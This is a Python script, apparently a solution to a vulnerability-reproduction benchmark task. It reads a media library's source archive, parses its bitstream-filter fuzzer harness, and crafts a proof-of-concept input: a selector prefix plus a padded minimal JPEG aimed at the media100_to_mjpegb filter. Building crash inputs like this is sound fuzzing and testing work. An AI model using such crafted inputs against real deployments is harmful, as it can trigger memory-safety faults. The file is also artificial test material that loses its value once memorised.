import os
import re
import tarfile
import zipfile
from typing import Dict, List, Optional, Tuple


AV_INPUT_BUFFER_PADDING_SIZE = 64


class _Archive:
    def __init__(self, path: str):
        self.path = path
        self._tar = None
        self._zip = None
        if tarfile.is_tarfile(path):
            self._tar = tarfile.open(path, "r:*")
        elif zipfile.is_zipfile(path):
            self._zip = zipfile.ZipFile(path, "r")
        else:
            raise ValueError("Unsupported archive format")

    def close(self):
        try:
            if self._tar is not None:
                self._tar.close()
        finally:
            if self._zip is not None:
                self._zip.close()

    def names(self) -> List[str]:
        if self._tar is not None:
            return self._tar.getnames()
        return self._zip.namelist()

    def read(self, name: str, max_bytes: Optional[int] = None) -> Optional[bytes]:
        try:
            if self._tar is not None:
                ti = self._tar.getmember(name)
                if not ti.isfile():
                    return None
                f = self._tar.extractfile(ti)
                if f is None:
                    return None
                try:
                    if max_bytes is None:
                        return f.read()
                    return f.read(max_bytes)
                finally:
                    f.close()
            else:
                with self._zip.open(name, "r") as f:
                    if max_bytes is None:
                        return f.read()
                    return f.read(max_bytes)
        except Exception:
            return None


def _to_text(b: bytes) -> str:
    if b is None:
        return ""
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return b.decode("latin-1", errors="ignore")


def _find_best_fuzzer_candidate(names: List[str]) -> Optional[str]:
    cands = []
    for n in names:
        ln = n.lower()
        if not (ln.endswith(".c") or ln.endswith(".cc") or ln.endswith(".cpp")):
            continue
        if "fuzzer" not in ln and "fuzz" not in ln:
            continue
        if "bsf" not in ln and "bitstream" not in ln:
            continue
        cands.append(n)

    if not cands:
        for n in names:
            ln = n.lower()
            if ln.endswith(".c") and "target_bsf_fuzzer" in ln:
                return n
        return None

    def score(name: str) -> int:
        ln = name.lower()
        s = 0
        if "target_bsf_fuzzer" in ln:
            s += 1000
        if "tools/" in ln or "/tools/" in ln:
            s += 200
        if "/fuzz" in ln:
            s += 150
        if "target_" in ln:
            s += 50
        if "bsf_fuzzer" in ln:
            s += 300
        return s

    cands.sort(key=score, reverse=True)
    return cands[0]


def _extract_function_body(text: str, funcname: str) -> Optional[str]:
    idx = text.find(funcname)
    if idx < 0:
        return None
    brace = text.find("{", idx)
    if brace < 0:
        return None
    i = brace
    depth = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return text[brace:i + 1]
        i += 1
    return None


def _find_pkt_data_assignment_pos(body: str) -> int:
    patterns = [
        r'\bpkt\s*\.\s*data\s*=\s*[^;]*\bdata\b',
        r'\bavpkt\s*\.\s*data\s*=\s*[^;]*\bdata\b',
        r'\bin_pkt\s*\.\s*data\s*=\s*[^;]*\bdata\b',
        r'\bpacket\s*\.\s*data\s*=\s*[^;]*\bdata\b',
    ]
    best = -1
    for p in patterns:
        m = re.search(p, body)
        if m:
            if best < 0 or m.start() < best:
                best = m.start()
    if best >= 0:
        return best
    m = re.search(r'\bdata\s*=\s*\(const\s+uint8_t\s*\*\)\s*[^;]+;', body)
    if m:
        return m.end()
    return -1


def _sum_data_increments(pre: str) -> int:
    total = 0
    for _ in re.finditer(r'\bdata\s*\+\+\s*;', pre):
        total += 1
    for _ in re.finditer(r'\b\+\+\s*data\s*;', pre):
        total += 1
    for m in re.finditer(r'\bdata\s*\+\=\s*(\d+)\s*;', pre):
        total += int(m.group(1))
    for m in re.finditer(r'\bdata\s*=\s*data\s*\+\s*(\d+)\s*;', pre):
        total += int(m.group(1))
    return total


def _parse_bsfs_array_and_index(text: str, target: str) -> Tuple[Optional[List[str]], Optional[int]]:
    arrays = []
    for m in re.finditer(r'\bbsfs\s*\[[^\]]*\]\s*=\s*\{(.*?)\}\s*;', text, flags=re.S):
        init = m.group(1)
        items = re.findall(r'"([^"]+)"', init)
        if items:
            arrays.append(items)
    for arr in arrays:
        if target in arr:
            return arr, arr.index(target)
    return None, None


def _infer_bsf_selector_expr(body: str) -> Tuple[int, int]:
    i = body.find("bsfs[")
    if i < 0:
        i = body.find("bsfs [")
    if i < 0:
        return 0, 1
    j = body.find("[", i)
    if j < 0:
        return 0, 1
    k = j + 1
    depth = 1
    n = len(body)
    while k < n and depth > 0:
        ch = body[k]
        if ch == "[":
            depth += 1
        elif ch == "]":
            depth -= 1
            if depth == 0:
                break
        k += 1
    expr = body[j + 1:k] if k < n else body[j + 1:j + 200]
    expr = expr.strip()

    if re.search(r'AV_R[BL]32\s*\(\s*data\s*\)', expr) or re.search(r'AV_R[BL]32\s*\(\s*data\s*\+\s*0\s*\)', expr):
        return 0, 4
    if re.search(r'AV_R[BL]16\s*\(\s*data\s*\)', expr) or re.search(r'AV_R[BL]16\s*\(\s*data\s*\+\s*0\s*\)', expr):
        return 0, 2

    m = re.search(r'\bdata\s*\[\s*(\d+)\s*\]', expr)
    if m:
        return int(m.group(1)), 1
    if re.search(r'\*\s*data\b', expr):
        return 0, 1
    return 0, 1


def _parse_min_required_size(text: str) -> int:
    max_n = 0
    for m in re.finditer(r'\bif\s*\(\s*size\s*<\s*(\d+)\s*\)', text):
        n = int(m.group(1))
        if n > max_n:
            max_n = n
    for m in re.finditer(r'\bif\s*\(\s*Size\s*<\s*(\d+)\s*\)', text):
        n = int(m.group(1))
        if n > max_n:
            max_n = n
    return max_n


def _build_minimal_grayscale_jpeg(total_len: int) -> bytes:
    soi = b"\xFF\xD8"
    app0 = b"\xFF\xE0\x00\x10" + b"JFIF\x00" + b"\x01\x01\x00\x00\x01\x00\x01\x00\x00"

    q = bytes([
        16, 11, 10, 16, 24, 40, 51, 61,
        12, 12, 14, 19, 26, 58, 60, 55,
        14, 13, 16, 24, 40, 57, 69, 56,
        14, 17, 22, 29, 51, 87, 80, 62,
        18, 22, 37, 56, 68, 109, 103, 77,
        24, 35, 55, 64, 81, 104, 113, 92,
        49, 64, 78, 87, 103, 121, 120, 101,
        72, 92, 95, 98, 112, 100, 103, 99
    ])
    dqt = b"\xFF\xDB\x00\x43" + b"\x00" + q

    sof0 = b"\xFF\xC0\x00\x0B" + b"\x08" + b"\x00\x01" + b"\x00\x01" + b"\x01" + b"\x01\x11\x00"

    dc_bits = bytes([0x00, 0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    dc_vals = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B])
    dht_dc = b"\xFF\xC4\x00\x1F" + b"\x00" + dc_bits + dc_vals

    ac_bits = bytes([0x00, 0x02, 0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7D])
    ac_vals = bytes([
        0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
        0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08, 0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0,
        0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0A, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
        0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
        0x6A, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
        0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3, 0xC4, 0xC5,
        0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xE1, 0xE2,
        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
        0xF9, 0xFA
    ])
    dht_ac = b"\xFF\xC4\x00\xB5" + b"\x10" + ac_bits + ac_vals

    sos = b"\xFF\xDA\x00\x08" + b"\x01" + b"\x01\x00" + b"\x00\x3F\x00"
    eoi = b"\xFF\xD9"

    prefix = soi + app0 + dqt + sof0 + dht_dc + dht_ac + sos
    min_scan = b"\x2B"  # DC category 0 + EOB + pad bits
    base_len = len(prefix) + len(min_scan) + len(eoi)

    if total_len <= base_len:
        return prefix + min_scan + eoi

    filler_len = total_len - base_len
    scan = min_scan + (b"\x00" * filler_len)
    return prefix + scan + eoi


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_bsf = "media100_to_mjpegb"

        arc = _Archive(src_path)
        try:
            names = arc.names()

            fuzzer_name = _find_best_fuzzer_candidate(names)
            fuzzer_text = ""
            fuzzer_body = None
            if fuzzer_name:
                fb = arc.read(fuzzer_name, max_bytes=2_000_000)
                if fb:
                    fuzzer_text = _to_text(fb)
                    fuzzer_body = _extract_function_body(fuzzer_text, "LLVMFuzzerTestOneInput")

            needs_selector = False
            selector_offset = 0
            selector_size = 1
            selector_value = 0
            prefix_len = 0
            min_req = 0

            if fuzzer_text:
                min_req = _parse_min_required_size(fuzzer_text)

            bsf_list, bsf_idx = (None, None)
            if fuzzer_text:
                bsf_list, bsf_idx = _parse_bsfs_array_and_index(fuzzer_text, target_bsf)

            if fuzzer_text and target_bsf in fuzzer_text and bsf_idx is None:
                if re.search(r'"\s*' + re.escape(target_bsf) + r'\s*"', fuzzer_text):
                    needs_selector = False

            if bsf_idx is not None and fuzzer_body:
                needs_selector = True
                selector_offset, selector_size = _infer_bsf_selector_expr(fuzzer_body)
                selector_value = bsf_idx

                pos_pkt = _find_pkt_data_assignment_pos(fuzzer_body)
                if pos_pkt >= 0:
                    pre = fuzzer_body[:pos_pkt]
                    prefix_len = _sum_data_increments(pre)
                else:
                    prefix_len = 1

                if prefix_len < selector_offset + selector_size:
                    prefix_len = selector_offset + selector_size

            total_len = max(1025, min_req, prefix_len + 300)
            pkt_len = max(200, total_len - prefix_len)

            jpeg = _build_minimal_grayscale_jpeg(pkt_len)

            if not needs_selector or prefix_len <= 0:
                return jpeg

            prefix = bytearray(b"\x00" * prefix_len)
            v = selector_value % (1 << (8 * selector_size))
            prefix[selector_offset:selector_offset + selector_size] = int(v).to_bytes(selector_size, "little", signed=False)

            return bytes(prefix) + jpeg
        finally:
            arc.close()